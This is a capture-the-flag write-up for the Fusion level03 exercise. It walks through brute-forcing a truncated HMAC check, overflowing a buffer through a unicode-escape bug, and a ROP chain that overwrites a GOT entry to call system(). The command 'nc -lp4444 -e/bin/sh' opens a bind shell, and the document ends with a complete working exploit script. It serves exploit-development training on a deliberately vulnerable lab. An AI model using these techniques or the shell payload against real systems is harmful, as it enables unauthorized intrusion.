+++
author = "pwntester"
categories = ["CTF", "Fusion", "exploit", "level03"]
date = 2013-12-31T17:34:00Z
description = ""
draft = false
slug = "fusion-level03-write-up"
tags = ["CTF", "Fusion", "exploit", "level03"]
title = "Fusion level03 write-up"

+++

## Fusion level03

In this [level](http://exploit-exercises.com/fusion/level03) we have to bypass ASLR and NX again:

![](/images/octopress/fusion02.png)

Before going into the stack overflow details, lets get a valid request to the server. When we connect to the server we are presented with a token that is later used to calculate the MAC code of our request.

```lang-clike line-numbers 
HMAC(EVP_sha1(), token, strlen(token), gRequest, gRequestSize, result, &len);
```

The application is calculating the MAC of whatever is stored in "gRequest" (token+JSON request) using SHA1 as the hashing algorithm, "token" as the encryption key and store the MAC in the memory pointed by "result". Then the application goes into the validation bits:

```lang-clike line-numbers 
invalid = result[0] | result[1]; // Not too bad :>
  if(invalid)
    errx(EXIT_FAILURE, "Checksum failed! (got %02x%02x%02x%02x...)",
    result[0], result[1], result[2], result[3]);
    // XXX won't be seen by user.
```

This means that its only checking the first 2 bytes and if they both are 0, then we will bypass the check.

We can calculate the MAC of our token+request using the provided token but we have no way to be sure that the first bytes are going to be 0'sure so what we need to do is to modify the "token+request" with unused data like a new JSON property so that we make sure that the hash is going to start with two NULL bytes before sending it. My brute force script:

```lang-python line-numbers 
#!/usr/bin/python

from socket import *
from struct import *
import json
from hashlib import sha1
import hmac

s = socket(AF_INET, SOCK_STREAM)
s.connect(("localhost", 20003))
print("[+] Getting token")
token = s.recv(1024)
token = token.strip().strip('"')
print("[+] Token: " + token)

test_request = '{ "title": "test", "contents": "test", "tags": ["test1", "test2"], "serverip": "127.0.0.1" }'
print("[+] Test request: " + test_request)
mac = hmac.new(token, token + "\n" + test_request, sha1).digest()
print("[+] Test request MAC: " + mac.encode('hex'))
print("[+] Modifying hash till it starts with 0000")

i = 0
new_request = ""
while True:
        new_request = test_request[0:-1] + ', "padding": "' + str(i) + '"}'
        hexmac = hmac.new(token, token + "\n" + new_request, sha1).digest().encode("hex")
        if "0000" in hexmac[0:4]:
                break
        i += 1
print("[+] New request: " + new_request)
print("[+] New MAC: " + hmac.new(token, token + "\n" + new_request, sha1).digest().encode("hex"))
print("[+] Sending test request to server")
s.send(token + "\n" + new_request)
s.close()
```

Lets try it with a breakpoint in the server "parse_request" function so we make sure that we passed the "validate_request" one:

```lang-bash line-numbers 
fusion@fusion:~$ python fusion03.py
[+] Getting token
[+] Token: // 127.0.0.1:36045-1388424557-265314943-2048946095-391959879
[+] Test request: { "title": "test", "contents": "test", "tags": ["test1", "test2"], "serverip": "127.0.0.1" }
[+] Test request MAC: 28e7cc4060bec9616ebcb0858a458144c3ccab3a
[+] Modifying hash till it starts with 0000
[+] New request: { "title": "test", "contents": "test", "tags": ["test1", "test2"], "serverip": "127.0.0.1" , "padding": "24133"}
[+] New MAC: 00008eb54a03fc3d286027bf54a6541c130dad36
[+] Sending test request to server
```

And we hit the breakpoint!

```lang-bash line-numbers 
(gdb) c
Continuing.

Breakpoint 1, parse_request () at level03/level03.c:86
86	in level03/level03.c
```

Now for the stack overflow. In the decode_string function there is a check to make sure that we dont copy beyond the "title" limits. However, when dealing with unicode characters, the "dest" pointer is incremented twice meaning that if we were exactly 1 byte below the buffer limit, after processing the unicode character, "dest" will be pointing one byte above the limit and thus failing the check: "while(*src && dest != end)" so it will continue processing characters from the source buffer into the destination buffer until there are no more bytes to process in the source buffer.

We can abuse this by sending a title that is 127 bytes long and then "\uXXXX" in order to be able to overwrite the destination buffer. After that we can send as many bytes as we want. Lets check it and see what is the required offset to overwrite the return address:

```lang-bash line-numbers 
test_request = '{ "title": "' + "A"*127 + "\\\\u4141" + "A"*31 + "DDDD" +'", "contents": "test", "tags": ["test1", "test2"], "serverip": "127.0.0.1" }'
```

And in gdb we will get:

```lang-bash line-numbers 
(gdb) c
Continuing.
[New process 14931]

Program received signal SIGSEGV, Segmentation fault.
[Switching to process 14931]
0x44444444 in ?? ()
```

Time to weaponize the exploit. Since we are already bruteforcing the hash collision, brute forcing the libc base address was going to be too much. So in this level we will try to use whatever is available in the binary.

GOT functions:

```lang-bash line-numbers 
fusion@fusion:~$ objdump -R /opt/fusion/bin/level03

/opt/fusion/bin/level03:     file format elf32-i386

DYNAMIC RELOCATION RECORDS
OFFSET   TYPE              VALUE
0804bcc0 R_386_GLOB_DAT    __gmon_start__
0804bdc0 R_386_COPY        stderr
0804bdc4 R_386_COPY        stdin
0804bde0 R_386_COPY        stdout
0804bcd0 R_386_JUMP_SLOT   __errno_location
0804bcd4 R_386_JUMP_SLOT   srand
0804bcd8 R_386_JUMP_SLOT   open
0804bcdc R_386_JUMP_SLOT   connect
0804bce0 R_386_JUMP_SLOT   setgroups
0804bce4 R_386_JUMP_SLOT   getpid
0804bce8 R_386_JUMP_SLOT   strerror
0804bcec R_386_JUMP_SLOT   daemon
0804bcf0 R_386_JUMP_SLOT   inet_ntoa
0804bcf4 R_386_JUMP_SLOT   json_object_array_length
0804bcf8 R_386_JUMP_SLOT   err
0804bcfc R_386_JUMP_SLOT   __fprintf_chk
0804bd00 R_386_JUMP_SLOT   signal
0804bd04 R_386_JUMP_SLOT   __gmon_start__
0804bd08 R_386_JUMP_SLOT   realloc
0804bd0c R_386_JUMP_SLOT   __printf_chk
0804bd10 R_386_JUMP_SLOT   strchr
0804bd14 R_386_JUMP_SLOT   calloc
0804bd18 R_386_JUMP_SLOT   inet_addr
0804bd1c R_386_JUMP_SLOT   write
0804bd20 R_386_JUMP_SLOT   HMAC
0804bd24 R_386_JUMP_SLOT   listen
0804bd28 R_386_JUMP_SLOT   json_object_array_get_idx
0804bd2c R_386_JUMP_SLOT   __libc_start_main
0804bd30 R_386_JUMP_SLOT   wait
0804bd34 R_386_JUMP_SLOT   json_object_get_string
0804bd38 R_386_JUMP_SLOT   read
0804bd3c R_386_JUMP_SLOT   strtol
0804bd40 R_386_JUMP_SLOT   setresuid
0804bd44 R_386_JUMP_SLOT   __asprintf_chk
0804bd48 R_386_JUMP_SLOT   setresgid
0804bd4c R_386_JUMP_SLOT   json_object_get_object
0804bd50 R_386_JUMP_SLOT   fflush
0804bd54 R_386_JUMP_SLOT   accept
0804bd58 R_386_JUMP_SLOT   json_tokener_parse
0804bd5c R_386_JUMP_SLOT   socket
0804bd60 R_386_JUMP_SLOT   dup2
0804bd64 R_386_JUMP_SLOT   memcpy
0804bd68 R_386_JUMP_SLOT   strlen
0804bd6c R_386_JUMP_SLOT   getppid
0804bd70 R_386_JUMP_SLOT   EVP_sha1
0804bd74 R_386_JUMP_SLOT   bind
0804bd78 R_386_JUMP_SLOT   errx
0804bd7c R_386_JUMP_SLOT   close
0804bd80 R_386_JUMP_SLOT   time
0804bd84 R_386_JUMP_SLOT   setvbuf
0804bd88 R_386_JUMP_SLOT   malloc
0804bd8c R_386_JUMP_SLOT   setrlimit
0804bd90 R_386_JUMP_SLOT   fork
0804bd94 R_386_JUMP_SLOT   setsockopt
0804bd98 R_386_JUMP_SLOT   rand
0804bd9c R_386_JUMP_SLOT   __sprintf_chk
0804bda0 R_386_JUMP_SLOT   strncmp
0804bda4 R_386_JUMP_SLOT   __snprintf_chk
0804bda8 R_386_JUMP_SLOT   getpeername
0804bdac R_386_JUMP_SLOT   exit
```

We dont have any "system" or "execve" like in previous level and since we dont have an "int 0×80" or "call [gs:0x10]" to make syscalls:

We will need to modify the GOT table and make any random function point the "system()" function in libc. We will benefit from the fact that for the same OS, same libc and same compilation options, the offset between libc functions should be constant.

```lang-bash line-numbers 
ROPeMe> search int %
Searching for ROP gadget:  int % with constraints: []
0x804942bL: int 3 ; mov ebx 0xd0ff0804 ; leave ;;

ROPeMe> search call %
Searching for ROP gadget:  call % with constraints: []
0x804942fL: call eax ; leave ;;
```

In this case I will overwrite the "srand()" function reference that is the closest to "system()":

```lang-bash line-numbers 
(gdb) p system
$8 = {<text variable, no debug info>} 0xb754fb20 <__libc_system>
(gdb) p srand
$10 = {<text variable, no debug info>} 0xb7545fc0 <__srandom>
```

0xb754fb20 - 0xb7545fc0 = 0x9b60

So we will need to increment srand GOT's entry in 0x9b60

We will need an "add [reg1] reg2" gadget for that:

```lang-bash line-numbers 
ROPeMe> search add [ %
Searching for ROP gadget:  add [ % with constraints: []
0x804ce9bL: add [eax+0x0] al ; add [eax] al ; add [eax] cl ;;
0x804dd77L: add [eax+eax] ah ;;
0x804ce9fL: add [eax] al ; add [eax] al ; add [eax] cl ;;
0x804ceb8L: add [eax] al ; add [eax] al ; xchg esi eax ;;
0x804cea1L: add [eax] al ; add [eax] cl ;;
0x8048bcaL: add [eax] al ; add [ebx-0x7f] bl ;;
0x804a2c2L: add [eax] al ; add [ebx-0x7f] bl ;;
0x8048bebL: add [eax] al ; add esp 0x8 ; pop ebx ;;
0x804dd76L: add [eax] al ; and al 0x0 ;;
0x804cebaL: add [eax] al ; xchg esi eax ;;
0x804cea3L: add [eax] cl ;;
0x80493feL: add [ebx+0x5d5b04c4] eax ;;
0x8049e03L: add [ebx+0x5e] bl ; pop edi ; pop ebp ;;
0x804964cL: add [ebx+0x5e] bl ; pop edi ;;
0x8048bccL: add [ebx-0x7f] bl ;;
0x804a2c4L: add [ebx-0x7f] bl ;;
0x8049646L: add [ecx+0x230c4] al ; add [ebx+0x5e] bl ; pop edi ;;
0x804ab3eL: add [edx] ecx ;;
```

"add [ebx+0x5d5b04c4] eax" operates with different register so it fits our requirements. The only thing is that the effective address is ebx + offset so we will need to account for that offset when changing the GOT entry. We will also need "pop" gadgets for ebx and eax:

```lang-bash line-numbers 
ROPeMe> search pop %
Searching for ROP gadget:  pop % with constraints: []
0x8049b4fL: pop eax ; add esp 0x5c ;;
0x8049207L: pop ebp ;;
0x8049403L: pop ebp ;;
0x8049c26L: pop ebp ;;
0x8049402L: pop ebx ; pop ebp ;;
0x804a2b7L: pop ebx ; pop ebp ;;
0x804964dL: pop ebx ; pop esi ; pop edi ;;
0x8048bf0L: pop ebx ;;
0x8049a4fL: pop ebx ;;
0x804a2d4L: pop ebx ;;
0x8049206L: pop edi ; pop ebp ;;
0x8049c25L: pop edi ; pop ebp ;;
0x8049e06L: pop edi ; pop ebp ;;
0x804964fL: pop edi ;;
0x8049205L: pop esi ; pop edi ; pop ebp ;;
0x8049c24L: pop esi ; pop edi ; pop ebp ;;
0x8049e05L: pop esi ; pop edi ; pop ebp ;;
0x804964eL: pop esi ; pop edi ;;
0x8049b52L: pop esp ;;
```

We have a "pop eax" followed by a esp increment so we will need to prepare the stack for that, but is feasible and several "pop ebx".

Os so with that we will use the following gadgets to modify the GOT reference:

* 0x80493feL: add [ebx+0x5d5b04c4] eax ;;
* 0x8049b4fL: pop eax ; add esp 0x5c ;;
* 0x8048bf0L: pop ebx ;;

And the ROP chain should be something like:

```lang-python line-numbers 
p += pack("<I", 0x8049b4f) 				 # pop eax ; add esp 0x5c
p += pack("<I", 0x0009b60) 				 # system - srand offset
"A"*0x5c 				   				 # so that esp points to the following instruction
p += pack("<I", 0x8048bf0) 				 # pop ebx ;;
p += pack("<I", (0x0804bcd4 - 0x5d5b04c4) & 0xffffffff) # srand entry - offset
p += pack("<I", 0x80493fe) 				 # add [ebx+0x5d5b04c4] eax
```

Lets give it a try to verify that we get the GOT properly set:

```lang-bash line-numbers 
Breakpoint 3, errx (status=1, format=0x804a37b "Unable to parse request") at err.c:197
197	err.c: No such file or directory.
	in err.c
```

Seems our request is not valid any longer. the \x00 in the (system-srand) offset look the culprit:

Lets use the unicode encoding:

```lang-python line-numbers 
p += pack("<I", 0x8049b4f) 				 # pop eax ; add esp 0x5c
p += "\\\u609b\\\u0000"					 # system - srand offset
p += "A"*0x5c 				   				 # so that esp points to the following instruction
p += pack("<I", 0x8048bf0) 				 # pop ebx ;;
p += pack("<I", (0x0804bcd4 - 0x5d5b04c4) & 0xffffffff) # srand entry - offset
p += pack("<I", 0x80493fe) 				 # add [ebx+0x5d5b04c4] eax
```

Now, we successfully overwrite the GOT reference to point to "system":

```lang-bash line-numbers 
(gdb) p system
$13 = {<text variable, no debug info>} 0xb754fb20 <__libc_system>
(gdb) x/x 0x0804bcd4
0x804bcd4 <srand@got.plt>:	0xb754fb20
```

Next bit is to execute "system()" with argument "nc -lv4444 -e/bin/sh" and with "exit" as its return address.
We will use the JSON "content" field to hold our system argument:

```lang-bash line-numbers 
(gdb) p &gContents
$15 = (unsigned char **) 0x804bdf4
```

Now we need "exit" PLT entry:

```lang-bash line-numbers 
0x8048f80 <exit@plt>
```

And of course, "srand" PLT entry:

```lang-bash line-numbers 
0x8048c20 <srand@plt>
```

This technique is known as return2PLT and we will jump to the address hold in the GOT table which now we control:

```lang-bash line-numbers 
(gdb) x/i 0x8048c20
   0x8048c20 <srand@plt>:	jmp    *0x804bcd4
(gdb) x/x 0x804bcd4
0x804bcd4 <srand@got.plt>:	0xb754fb20
(gdb) p system
$21 = {<text variable, no debug info>} 0xb754fb20 <__libc_system>
```

So our exploit now looks like:

```lang-python line-numbers 
p = ""
p += pack("<I", 0x8049b4f)                               # pop eax ; add esp 0x5c
p += "\\\u609b\\\u0000"                                  # system - srand offset
p += "A"*0x5c                                                            # so that esp points to the following instruction
p += pack("<I", 0x8048bf0)                               # pop ebx ;;
p += pack("<I", (0x0804bcd4 - 0x5d5b04c4) & 0xffffffff)
p += pack("<I", 0x80493fe)                               # add [ebx+0x5d5b04c4] eax
p += pack("<I", 0x8048c20)                               # srand(system) PLT entry address
p += pack("<I", 0x8048f80)								 # return address is PLT entry for exit()
p += pack("<I", 0x804bdf4)                               # argument to system() stored in gContent

cmd = "nc -lp4444 -e/bin/sh"

test_request = '{ "title": "' + "A"*127 + "\\\\u4141" + "A"*31 + p + '", "contents": "' + cmd + '", "tags": ["test1", "test2"], "serverip": "127.0.0.1" }'
```

If we run the exploit we can see in gdb:

```lang-bash line-numbers 
Breakpoint 1, 0x08048c20 in srand@plt ()
(gdb) p &gContents
$2 = (unsigned char **) 0x804bdf4
(gdb) x/s &gContents
0x804bdf4 <gContents>:	 ""
```

So our command is not stored directly in "gContents" that contains the address where our command is stored:

```lang-bash line-numbers 
(gdb) x/s *0x804bdf4
0x89dd520:	 "nc -lp4444 -e/bin/sh"
```


However this address is not always the same:

```lang-bash line-numbers 
Breakpoint 1, 0x080493fe in ?? ()
(gdb) x/s *0x804bdf4
0x89dd528:	 "nc -lp4444 -e/bin/sh"
```

So I modified the exploit to add a "/" sled in front of the command and point to an address higher than the values I was getting: 0x89dd550

So we will modify the payload:

```lang-python line-numbers 
p = ""
p += pack("<I", 0x8049b4f)                               # pop eax ; add esp 0x5c
p += "\\\u609b\\\u0000"                                  # system - srand offset
p += "A"*0x5c                                                            # so that esp points to the following instruction
p += pack("<I", 0x8048bf0)                               # pop ebx ;;
p += pack("<I", (0x0804bcd4 - 0x5d5b04c4) & 0xffffffff)
p += pack("<I", 0x80493fe)                               # add [ebx+0x5d5b04c4] eax
p += pack("<I", 0x8048c20)                               # srand(system) PLT entry address
p += pack("<I", 0x8048f80)								 # return address is PLT entry for exit()
p += pack("<I", 0x89dd520)                               # argument to system() stored in gContent

cmd = "//////////////////////////////////bin/nc -lp4444 -e/bin/sh"

test_request = '{ "title": "' + "A"*127 + "\\\\u4141" + "A"*31 + p + '", "contents": "' + cmd + '", "tags": ["test1", "test2"], "serverip": "127.0.0.1" }'
```

And now we can try to exploit it:

```lang-bash line-numbers 
fusion@fusion:~$ python fusion03.py
[+] Getting token
[+] Token: // 127.0.0.1:36122-1388501703-1229195771-453656053-1284067548
[+] Test request: { "contents": "//////////////////////////////////bin/nc -lp4444 -e/bin/sh", "title": "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\\u4141AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAO\\u609b\\u0000AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA���� �P", "tags": ["test1", "test2"], "serverip": "127.0.0.1" }
[+] Test request MAC: a5794aed31a1a8e94ccd57ab01f152c6790bd55c
[+] Modifying hash till it starts with 0000
[+] New request: { "contents": "//////////////////////////////////bin/nc -lp4444 -e/bin/sh", "title": "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\\u4141AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAO\\u609b\\u0000AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA���� �P", "tags": ["test1", "test2"], "serverip": "127.0.0.1" , "padding": "229584"}
[+] New MAC: 000060b6cb9276479337793f75580b24049ebab3
[+] Sending test request to server
```

And in gdb we get:

```lang-bash line-numbers 
(gdb) c
Continuing.
[New process 21509]
process 21509 is executing new program: /bin/bash
process 21509 is executing new program: /bin/nc6
```

So lets check if the shell is waiting for us:

```lang-bash line-numbers 
fusion@fusion:~$ sudo netstat -natp | grep nc
tcp        0      0 0.0.0.0:4444            0.0.0.0:*               LISTEN      21509/nc
fusion@fusion:~$ nc localhost 4444
id
uid=20003 gid=20003 groups=20003
```

The complete exploit:

```lang-python line-numbers 
#!/usr/bin/python

from socket import *
from struct import *
from hashlib import sha1
import hmac

s = socket(AF_INET, SOCK_STREAM)
s.connect(("localhost", 20003))
print("[+] Getting token")
token = s.recv(1024)
token = token.strip().strip('"')
print("[+] Token: " + token)

p = ""
p += pack("<I", 0x8049b4f)                               # pop eax ; add esp 0x5c
p += "\\\u609b\\\u0000"                                  # system - srand offset
p += "A"*0x5c                                                            # so that esp points to the following instruction
p += pack("<I", 0x8048bf0)                               # pop ebx ;;
p += pack("<I", (0x0804bcd4 - 0x5d5b04c4) & 0xffffffff)
p += pack("<I", 0x80493fe)                               # add [ebx+0x5d5b04c4] eax
p += pack("<I", 0x8048c20)                               # srand(system) PLT entry address
p += pack("<I", 0x8048f80)                               # return address is PLT entry for exit()
p += pack("<I", 0x89dd550)                               # argument to system() stored in gContent
cmd = "//////////////////////////////////bin/nc -lp4444 -e/bin/sh"

test_request = '{ "contents": "' + cmd + '", "title": "' + "A"*127 + "\\\\u4141" + "A"*31 + p + '", "tags": ["test1", "test2"], "serverip": "127.0.0.1" }'

print("[+] Test request: " + test_request)
mac = hmac.new(token, token + "\n" + test_request, sha1).digest()
print("[+] Test request MAC: " + mac.encode('hex'))
print("[+] Modifying hash till it starts with 0000")

i = 0
new_request = ""
while True:
        new_request = test_request[0:-1] + ', "padding": "' + str(i) + '"}'
        hexmac = hmac.new(token, token + "\n" + new_request, sha1).digest().encode("hex")
        if "0000" in hexmac[0:4]:
                break
        i += 1
print("[+] New request: " + new_request)
print("[+] New MAC: " + hmac.new(token, token + "\n" + new_request, sha1).digest().encode("hex"))
print("[+] Sending test request to server")
s.send(token + "\n" + new_request)
s.close()
```







